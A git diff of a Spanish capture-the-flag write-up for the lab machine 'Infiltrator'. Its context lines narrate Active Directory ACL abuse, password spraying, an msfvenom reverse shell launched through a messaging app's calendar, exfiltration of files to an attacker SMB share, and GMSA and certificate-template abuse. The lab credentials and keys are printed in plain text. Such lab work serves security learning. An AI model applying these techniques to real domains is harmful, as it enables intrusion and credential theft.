@@ -15,11 +15,11 @@ layout:
     visible: true
 ---
 
-# Infiltrator
+# Copy of gzzcooInfiltrator
 
 
 
-<figure><img src="../../../.gitbook/assets/Infiltrator.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Infiltrator.png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Reconnossaince
 
@@ -179,7 +179,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
-<figure><img src="../../../.gitbook/assets/3767_vmware_OivLvdlWzD.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3767_vmware_OivLvdlWzD.png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de `netexec` y `ldapsearch` procederemos a enumerar el equipo para localizar más información. Entre la información obtenida, verificamos el `hostname`, versión del SO y el nombre del dominio.
 
@@ -215,13 +215,13 @@ nameserver 10.10.11.31
 
 Nuestro primer objetivo será la página web de [http://infiltrator.htb](http://infiltrator.htb), en la cual a simple vista no vemos ningún dato interesante que nos pueda servir.&#x20;
 
-<figure><img src="../../../.gitbook/assets/imagen (42).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (42).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Information Leakage
 
 Revisando en el apartado de `About`, verificamos que aparecen nombres de los empleados. Esta información nos puede servir.
 
-<figure><img src="../../../.gitbook/assets/imagen (43).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (43).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Guardaremos los nombres completos de los empleados que aparecían en la página. A través del script de `namenash.py` procederemos a crear un listado de usuarios a través del listado de empleados que disponemos.
 
@@ -369,7 +369,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Al revisar el archivo `domain_users`, verificamos el listado de usuarios del dominio. También notamos que el usuario `k.turner@infiltrator.htb` en su campo _**Description**_ aparece lo que parece ser una contraseña.
 
-<figure><img src="../../../.gitbook/assets/3778_vmware_gF6h8Noeyf.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3778_vmware_gF6h8Noeyf.png" alt=""><figcaption></figcaption></figure>
 
 Probaremos de validar si esas credenciales encontradas en el LDAP son válidas para el usuario. Verificamos que no podemos autenticarnos con estas credenciales, alomejor nos pueden servir para más adelante...
 
@@ -493,11 +493,11 @@ INFO: Compressing output into 20250117191838_bloodhound.zip
 
 Revisando en `BloodHound`, verificamos que solamente el usuario `Administrator` es un `Domain Admin`.
 
-<figure><img src="../../../.gitbook/assets/imagen (44).png" alt="" width="536"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (44).png" alt="" width="536"><figcaption></figcaption></figure>
 
 Verificando posibles vías potenciales para escalar nuestros privilegios actuales, nos encontramos con el siguiente path que parece ser el más adecuado para llegar a conectarnos al Domain Controller.
 
-<figure><img src="../../../.gitbook/assets/imagen (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (45).png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Access
 
@@ -507,7 +507,7 @@ Verificamos que el usuario que disponemos actualmente, dispone de privilegios `G
 
 Esto indica que tiene el control total sobre la OU, un privilegio peligroso debido que podemos tener el control total de esta OU y de los objetos que se encuentren en esta misma.
 
-<figure><img src="../../../.gitbook/assets/imagen (46).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (46).png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de `bloodyAD` nos convertimos en propietarios de la OU y nos otorgamos permisos de `genericAll` para tener control de la OU y de los objetos que se encuentren en esta.
 
@@ -557,7 +557,7 @@ Volviendo a revisar en el `BloodHound`, verificamos que en la OU `MARKETING DIGI
 
 Por lo tanto, dado que nos hemos otorgado el control total sobre la OU y los objetos secundarios, por ende, deberíamos de tener control total con el usuario `d.anderson@infiltrator.htb` sobre el usuario `e.rodriguez@infiltrator.htb`.
 
-<figure><img src="../../../.gitbook/assets/3773_vmware_Q1dBZ5tiUG.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3773_vmware_Q1dBZ5tiUG.png" alt=""><figcaption></figcaption></figure>
 
 A través de `bloodyAD` realizamos el cambio de contraseña del usuario mencionado. Posteriormente a través de `nxc`,verificamos que el cambio se realizó correctamente.
 
@@ -576,7 +576,7 @@ Revisando nuevamente en la ruta que encontramos en `BloodHound`, verificamos que
 
 Por lo tanto, el usuario dispone de permisos para añadirse a sí mismo al grupo mencionado.
 
-<figure><img src="../../../.gitbook/assets/imagen (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (47).png" alt=""><figcaption></figcaption></figure>
 
 Lo primero de todo será solicitar un TGT (Ticket Granting Ticket) del usuario `e.rodriguez@infiltrator.htb`. Almacenaremos el ticket TGT en la variable `KRB5CCNAME` y validaremos que esté correctamente configurada.
 
@@ -621,7 +621,7 @@ member: CN=O.martinez,CN=Users,DC=infiltrator,DC=htb
 
 En `BloodHound` verificamos que los miembros del grupo `CHIEFS MARKETING` disponen del permiso `ForceChangePassword` sobre el usuario `m.harris@infiltrator.htb`, pudiendo modifcarle la contraseña sin disponer de la actual del usuario.
 
-<figure><img src="../../../.gitbook/assets/3775_vmware_svxj9lerbR.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3775_vmware_svxj9lerbR.png" alt=""><figcaption></figcaption></figure>
 
 Realizaremos el cambio de contraseña del usuario `m.harris@infiltrator.htb` a través de la herramienta de `bloodyAD`, verificaremos que se ha modificado correctamente las credenciales.
 
@@ -638,7 +638,7 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\m.h
 
 Revisando nuevamente en `BloodHound`, verificamos que el usuario que disponemos tiene privilegios de `CanPSRemote` sobre el Domain Controller `DC01`. Esto nos proporciona el privilegio de acceder remotamente al equipo, mediante WinRM o RDP.
 
-<figure><img src="../../../.gitbook/assets/3776_vmware_RW16mO6T8p.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3776_vmware_RW16mO6T8p.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a solicitar el TGT (Ticket Granting Ticket) del usuario actual, verificaremos que se encuentra correctamente configurado el TGT.
 
@@ -752,7 +752,7 @@ Realizamos una búsqueda por internet sobre la aplicación. Al parecer, es una a
 Output Messenger --> Herramienta de colaboración que permite la productividad del equipo a través de mensajería LAN instantánea, transferencia de archivos, uso compartido de escritorio remoto y más.
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/imagen (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (48).png" alt=""><figcaption></figcaption></figure>
 
 Para buscar posibles vectores de escalar nuestros privilegios en la máquina víctima, decidimos hacer uso de la herramienta de `winPEAS.exe`. Este binario lo deberemos de disponer en nuestro equipo local, lo compartiremos a través de un servidor web.
 
@@ -812,7 +812,7 @@ PS C:\Windows\System32\spool\drivers\color> copy result.txt \\10.10.16.5\smbFold
 
 Revisando el resultado obtenido del escaneo de `winPEAS`, verificamos que existen varios puertos en escucha sobre la aplicación de `Output Messenger`. Lo cual nos hace pensar que la aplicación está en ejecución en el DC actualmente.
 
-<figure><img src="../../../.gitbook/assets/3781_vmware_3etBeOfUpS.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3781_vmware_3etBeOfUpS.png" alt=""><figcaption></figcaption></figure>
 
 ### Performing a Windows port forwarding to my Kali machine
 
@@ -964,11 +964,11 @@ Descargaremos la aplicación de `Output Messenger` desde el siguiente enlace, de
 
 Si bien recordamos, en la enumeración de LDAP, encontramos en el campo _**Description**_ lo que parecía ser una contraseña.
 
-<figure><img src="../../../.gitbook/assets/imagen (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (49).png" alt=""><figcaption></figcaption></figure>
 
 Abriremos la aplicación de `Output Messenger` y procederemos a iniciar sesión con las credenciales `k.turner/MessengerApp@Pass!`. La dirección IP que especificaremos es la que disponemos en nuestra máquina Kali de la interfaz física `eth0`.
 
-<figure><img src="../../../.gitbook/assets/imagen (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (50).png" alt=""><figcaption></figcaption></figure>
 
 Perfecto, hemos podido iniciar sesión en la aplicación con el usuario`k.turner`. A continuación, deberemos explorar los diferentes chats y funciones para intentar buscar algún tipo de información interesante.
 
@@ -979,19 +979,19 @@ En el **chatroom** `Dev_chat` encontramos la siguiente conversación, donde se d
 * **Opciones de entrada**: La herramienta admitirá argumentos de línea de comandos para el nombre de usuario, la contraseña y el usuario buscado, ofreciendo una opción predeterminada para facilitar el uso.
 * **Estado actual**: Actualmente, la aplicación está en fase de pruebas exhaustivas realizadas por el equipo de control de calidad, y se están refinando los mensajes de error para asegurar una experiencia fluida para el usuario.
 
-<figure><img src="../../../.gitbook/assets/imagen (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (51).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/imagen (52).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (52).png" alt=""><figcaption></figcaption></figure>
 
 #### Information leakage (password filtered in notices)
 
 Si nos dirigimos al apartado de `Notices`, vemos una noticia que habla sobre una alerta sobre la autenticación previa se encuentra deshabilitada en Kerberos para algunos usuarios. Esto nos confirma el motivo por el cual algunos usuarios aparecían como restringidos.
 
-<figure><img src="../../../.gitbook/assets/imagen (53).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (53).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Por otro lado, también vemos que en las noticias aparecen lo que parecen ser las credenciales de acceso del usuario `m.harris@infiltrator.htb`.
 
-<figure><img src="../../../.gitbook/assets/imagen (54).png" alt="" width="539"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (54).png" alt="" width="539"><figcaption></figcaption></figure>
 
 Probaremos de  realizar un _**Password Spraying**_ para verificar si estas credenciales son válidas para algún usuario.
 
@@ -1011,21 +1011,21 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\l.c
 
 Probaremos de autenticarnos en la aplicación de `Output Messenger` en busca de ver si con este usuario tenemos más información interesante que nos pueda servir.
 
-<figure><img src="../../../.gitbook/assets/imagen (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (55).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que disponemos de un chat con el usuario `Admin`, el cual nos comparte el binario de la aplicación `UserExplorer.exe` que anteriormente estuvieron hablando en el chat de `Dev_Chat`. Nos descargaremos el binario accediendo a través de la opción de `Open Folder`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/imagen (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (56).png" alt=""><figcaption></figcaption></figure>
 
 Dispondremos del binario de `UserExplorer.exe`, el cual realizaremos una copia en nuestro `Desktop`.
 
-<figure><img src="../../../.gitbook/assets/imagen (57).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (57).png" alt=""><figcaption></figcaption></figure>
 
 #### Debugging with dnSpy
 
 Al analizar el binario, nos encontramos que aparecen las credenciales cifradas del usuario `winrm_svc`. Si bien recordamos en la conversación del **chatroom** de `Dev_Chat`, estaban intentando cifrar esta contraseña en cifrado `AES`.
 
-<figure><img src="../../../.gitbook/assets/imagen (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (58).png" alt=""><figcaption></figcaption></figure>
 
 A través del siguiente script, lo que realizaremos es descodificar la contraseña cifrada para obtenerla en texto plano.
 
@@ -1089,13 +1089,13 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\win
 
 Probaremos de acceder a `Output Messenger` con las credenciales recién obtenidas.
 
-<figure><img src="../../../.gitbook/assets/imagen (192).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (192).png" alt=""><figcaption></figcaption></figure>
 
 Revisando los chats, `O. Martínez` reportó que recibe ventanas emergentes de sitios web al azar todos los días a las 09:00 a. m. Durante la conversación, mencionó que no ha compartido su contraseña, salvo con el grupo `Chiefs_Marketing_chat`.
 
 Esto nos interesa, ya que revisar las conversaciones de ese grupo podría revelar detalles sobre la contraseña del usuario, permitiéndonos verificar su validez y potencialmente utilizarla para realizar ataques de pivoting o escalar privilegios.
 
-<figure><img src="../../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>
 
 Por otro lado, en la sección de notas, verificamos que nos aparece una API Key, deberemos investigar si podemos hacer uso de esta API Key en algún servicio.
 
@@ -1103,7 +1103,7 @@ Por otro lado, en la sección de notas, verificamos que nos aparece una API Key,
 lan\_managment api key 558R501T5I6024Y8JV3B7KOUN1A518GG
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>
 
 #### Using Output Messenger API to retrieve conversations logs on a group
 
@@ -1111,7 +1111,7 @@ Buscamos por internet información sobre la API de `Output Messenger`, en la cua
 
 {% embed url="https://support.outputmessenger.com/output-messenger/api-helper/" %}
 
-<figure><img src="../../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>
 
 Revisando más información sobre las posibilidades del uso del API, verificamos que hay un apartado en el cual a través de la API, podemos visualizar los logs de un **chat room.**
 
@@ -1127,23 +1127,23 @@ Nos faltaría saber cual es la `roomkey` del **chat room** que queremos revisar 
 
 {% embed url="https://support.outputmessenger.com/chat-room-api/" %}
 
-<figure><img src="../../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>
 
 Para empezar, primero revisaremos como funciona la API, en este ejemplo, se nos muestra como authenticarnos a través de nuestra **API-KEY**.
 
 {% embed url="https://support.outputmessenger.com/authentication-api/" %}
 
-<figure><img src="../../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>
 
 
 
 Desde nuestra máquina Kali, interceptaremos la solicitud con _**FoxyProxy**_ y _**BurpSuite**_ sobre la dirección [http://127.0.0.1:14125/api/users](http://127.0.0.1:14125/api/users), lo realizamos desde localhost (127.0.0.1) ya que anteriormente nos compartimos los puertos internos del DC a nuestra Kali Linux.
 
-<figure><img src="../../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
 
 Al tener la solicitud interceptada en _**BurpSuite**_, le indicaremos la `API-KEY` que encontramos anteriormente. Verificamos que hemos podido consultar los usuarios correctamente tal y como nos indicaba el ejemplo de `Authentication`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos como utilizar el `API-KEY` para utilizar la API, ahora lo único que nos queda es saber cual es el `roomkey` del **chat room** de `Chiefs_Marketing_chat`.
 
@@ -1151,7 +1151,7 @@ Después de una larga búsqueda, decidimos revisar si en el `AppData` del usuari
 
 Revisando los grupos a los que formaba parte el usuario `winrm_svc`, verificamos que formaba parte del grupo `Remote Management Users`, por lo tanto nos podremos conectar en remoto al equipo.
 
-<figure><img src="../../../.gitbook/assets/imagen (193).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (193).png" alt=""><figcaption></figcaption></figure>
 
 Para ello, primero deberemos de solicitar un TGT (Ticket Granting Ticket) del usuario, almacenarlo en la variable `KRB5CCNAME` y verificar que el ticket TGT esté correctamente configurado.
 
@@ -1247,11 +1247,11 @@ Por lo tanto, siguiendo el `API Helper` de la documentación del `Output Messeng
 
 En este caso, buscaremos los logs entre las fechas del 19 al 20 de febrero utilizando la `roomkey`. Verificamos que hemos logrado al parecer leer los logs de este chat.
 
-<figure><img src="../../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>
 
 Revisando los logs del chat, verificamos lo que parece ser el mensaje que decía `O.martinez` en el cual compartía su contraseña en este grupo.
 
-<figure><img src="../../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a verificar si estas credenciales siguen siendo válidas a nivel de dominio. En este caso, al parecer, la usuaria debió cambiar sus credenciales por seguridad después de recibir varias alertas de SPAM.
 
@@ -1265,17 +1265,17 @@ SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\O.m
 
 De casualidad, probamos de autenticarnos con estas credenciales al `Output Messenger`, para verificar si el usuario había cambiado también las credenciales en esta aplicación de mensajería.
 
-<figure><img src="../../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>
 
 Logramos acceder con el usuario `O.martinez`, además logramos visualizar el grupo `Chiefs_Marketing_chat` en el cual efectivamente, había compartido sus credenciales de acceso.
 
-<figure><img src="../../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>
 
 #### Running a malicious binary to get a Reverse Shell with a Calendar "Run application" function on Output Messenger
 
 Revisando las funciones de la aplicación, nos encontramos que a través de crear un nuevo evento en el calendario, eramos capaces de ejecutar una aplicación.
 
-<figure><img src="../../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>
 
 Por lo tanto, lo que se probó a realizar es a crear un payload malicioso de una Reverse Shell. En este caso se utilizó `msfvenom` para crear un binario `.exe` malicioso que al ejecutarse nos proporcionaría una Reverse Shell. Compartiremos este binario malicioso a través de un servidor web.
 
@@ -1332,7 +1332,7 @@ C:\temp>
 
 Por lo tanto, el objetivo será crear un  nuevo evento para intentar y verificar si el usuario `O.martinez` es capaz de ejecutar el binario malicioso `reverse.exe` correctamente  y obtener una Shell con ese usuario.
 
-<figure><img src="../../../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos que se ha creado correctamente el evento. Deberemos de esperar a que el tiempo transcurra y verificar si funciona o no.&#x20;
 
@@ -1340,7 +1340,7 @@ Verificamos que se ha creado correctamente el evento. Deberemos de esperar a que
 _En nuestro caso, intentamos adelantar la hora de Windows manualmente, y por x motivos a veces funcionaba y otras no._
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>
 
 Después de diversas pruebas, logramos obtener una Shell como usuario `O.martinez@infiltrator.htb`.
 
@@ -1397,15 +1397,15 @@ PS C:\Users\O.martinez\AppData\Roaming\Ouput Messenger\FAAA\Received Files\20330
 
 Abriremos la captura de Wireshark obtenida, verificaremos el siguiente resultado.
 
-<figure><img src="../../../.gitbook/assets/imagen (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (28).png" alt=""><figcaption></figcaption></figure>
 
 En el resultado obtenido, verificamos que hay una solicitud que se descarga a través del métoddo `GET`, un archivo llamado `BitLocker-backup.7z`. Lo que intentaremos es recuperar el archivo original. Para ello, en la solicitud donde se confirmó la descarga con un `200 OK`, haremos click derecho e ingresaremos a `Seguir < HTTP Stream`.
 
-<figure><img src="../../../.gitbook/assets/imagen (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (30).png" alt=""><figcaption></figcaption></figure>
 
 Indicaremos que muestra la `Conversación completa` y que el resultado se muestre en formato `Raw`, guardaremos el archivo en nuestro directorio de trabajo.
 
-<figure><img src="../../../.gitbook/assets/imagen (32).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (32).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Verificaremos que disponemos del archivo `BitLocker-backup.raw`, procederemos a revisar el archivo a través de la herramienta de `hexedit`.
 
@@ -1423,7 +1423,7 @@ El objetivo será recuperar el archivo original obtenido de la captura de Wiresh
 
 Revisando el archivo en hexadecimal y situándonos en la cabecera de donde empieza el archivo, vemos que en la parte inferior nos muestra que el archivo empieza por los valores `0x3A5/0x33554`.
 
-<figure><img src="../../../.gitbook/assets/imagen (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (33).png" alt=""><figcaption></figcaption></figure>
 
 El siguiente paso será eliminar toda la parte superior del archivo `raw`. Para ello, crearemos dos variables de entorno que nos indique la posición exacta del byte y que a partir de ahí sobreescriba el archivo `.raw`.
 
@@ -1547,11 +1547,11 @@ _BitLocker es una característica de seguridad de Windows que proporciona cifrad
 Clave obtenida: _650540-413611-429792-307362-466070-397617-148445-087043_
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/3817_vmware_BPZRPdztGU.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3817_vmware_BPZRPdztGU.png" alt=""><figcaption></figcaption></figure>
 
 Revisando nuevamente el archivo de Wireshark obtenido, verificamos que el usuario `O.martinez` realizó un cambio de credenciales y estas aparecen en texto plano.
 
-<figure><img src="../../../.gitbook/assets/imagen (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (34).png" alt=""><figcaption></figcaption></figure>
 
 Verificaremos si estas nuevas credenciales obtenidas nos permiten acceder al sistema, efectivamente hemos logrado autenticarnos correctamente.
 
@@ -1563,7 +1563,7 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\O.m
 
 Revisamos en `BloodHound` de que el usuario `O.martinez@infiltrator.htb` dispone de privilegios `CanRDP` sobre el equipo `DC01`. Por lo cual podríamos conectarnos por RDP al Domain Controller.
 
-<figure><img src="../../../.gitbook/assets/imagen (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (41).png" alt=""><figcaption></figcaption></figure>
 
 Nos conectaremos mediante `xfreerdp3` al DC para tener acceso remoto por RDP y tener entorno gráfico.
 
@@ -1573,19 +1573,19 @@ Nos conectaremos mediante `xfreerdp3` al DC para tener acceso remoto por RDP y t
 
 Verificamos que disponemos del disco `C:` y de una unidad cifrada con BitLocker `E:`.
 
-<figure><img src="../../../.gitbook/assets/imagen (35).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (35).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Al intentar acceder a la unidad `E:`, verificamos que nos requiere de credenciales para acceder. Entre las opciones nos aparece la opción de `Enter recovery key` para introducir una clave de recuperación de BitLocker.
 
-<figure><img src="../../../.gitbook/assets/imagen (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (36).png" alt=""><figcaption></figcaption></figure>
 
 Ingresaremos la clave de recuperación de BitLocker que obtuvimos anteriormente para desbloquear la unidad cifrada.
 
-<figure><img src="../../../.gitbook/assets/imagen (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (37).png" alt=""><figcaption></figcaption></figure>
 
 Conseguimos tener acceso a la unidad `E:`, entre los directorios de la unidad, verificamos que en el directorio `E:\Windows Server 2012 R2 - Backups\Users\Administrator\Documents` disponía de un archivo de backup llamado `Backup_Credentials.7z`.
 
-<figure><img src="../../../.gitbook/assets/imagen (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (38).png" alt=""><figcaption></figcaption></figure>
 
 Deberemos de compartir este archivo a nuestro equipo local. Para ello, montaremos un servidor SMB que utilice las credenciales del usuario `O.martinez`.
 
@@ -1602,7 +1602,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 Conectaremos esta unidad en el DC y copiaremos el archivo de Backup en nuestro recurso compartido.
 
-<figure><img src="../../../.gitbook/assets/imagen (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (39).png" alt=""><figcaption></figcaption></figure>
 
 Verificaremos que logramos tener el archivo de Backup, al proceder a descomprimir el archivo, verificamos que logramos disponer lo que parece ser de un Backup de los archivos `NTDS.dit`, `SYSTEM` y `SECURITY`.
 
@@ -1702,7 +1702,7 @@ Dado que no logramos extraer ningún tipo de información ni ninguna credencial 
 
 Al revisar en los diferentes campos, logramos verificar que aparece lo que parecen ser unas credenciales para el usuario `lan_managment@infiltrator.htb`.
 
-<figure><img src="../../../.gitbook/assets/imagen (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (40).png" alt=""><figcaption></figcaption></figure>
 
 Validaremos si estas credenciales siguen siendo válidas para el usuario encontrado. Efectivamente estas credenciales nos sirven correctamente.
 
@@ -1716,7 +1716,7 @@ SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_mana
 
 Al revisar nuevamente en `BloodHound`, verificamos que el usuario que disponemos, tiene privilegios de `ReadGMSAPassword` sobre el objeto `infiltrator_svc$@infiltrator.htb`.
 
-<figure><img src="../../../.gitbook/assets/3826_vmware_SZ2AxABKSL.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3826_vmware_SZ2AxABKSL.png" alt=""><figcaption></figcaption></figure>
 
 A través de la herramienta de `bloodyAD`, procederemos a leer la contraseña del GMSA. Logramos obtener el hash NTLM del objeto en cuestión.
 
@@ -1740,7 +1740,7 @@ SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\infiltra
 
 Buscando vías potenciales de elevar nuestros privilegios, verificamos que este usuario, forma parte del grupo `Certificate Service DCOM Access`, lo cual nos replantea investigar si podemos abusar de los ADCS (Active Directory Certificate Services).
 
-<figure><img src="../../../.gitbook/assets/3827_vmware_MGvRJk4XWu (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3827_vmware_MGvRJk4XWu (1).png" alt=""><figcaption></figcaption></figure>
 
 Con la herramienta de `certipy-ad` buscaremos si existe algún template que sea vulnerable. En este caso nos muestra que podemos efectuar el `ESC4`.
 
